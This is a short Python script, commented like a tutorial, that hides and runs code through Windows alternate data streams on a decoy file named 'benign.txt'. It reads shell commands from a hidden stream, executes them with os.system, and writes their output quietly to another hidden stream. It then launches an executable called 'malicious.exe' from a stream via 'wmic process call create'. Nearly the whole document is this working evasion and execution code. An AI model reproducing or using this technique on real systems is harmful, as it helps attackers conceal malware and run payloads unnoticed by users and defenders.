# This script creates a decoy file with alternate data streams (ADS), which could themselves contain malicious content.
# ADSs are only viewable in Windows with /R of the dir command. 
# This hides files well (more than hidden files), because one must know they exist, and how to locate them in order to find them.
# They are also not readable or accessible in from CMD with all the ways normal files are.
# In addition to hiding ADSs, the script hides artifacts by leaving results of hidden executables in a text ADS.

import os

def buildADSFilename(filename,streamname):
	return filename+":"+streamname

decoy = "benign.txt"
resultfile = buildADSFilename(decoy,"results.txt")
commandfile = buildADSFilename(decoy,"commands.txt")
# The buildADSFilename function creates ADSs by using special name syntax.

with open(commandfile,"r") as c:
    for line in c:
        str(os.system(line + " >> " + resultfile))
	# This block uses the os library to run the commands on each line of commandfile,
	# and pipes the results to resultfile so that the output of the commands is "quiet."

exefile = "malicious.exe"
exepath = os.path.join(os.getcwd(),buildADSFilename(decoy,exefile))
os.system("wmic process call create "+exepath)
# This block runs a malicious executable that is itself stored in an ADS. 
# It requires the special syntax because Windows does not process ADSs the same way it does other files.
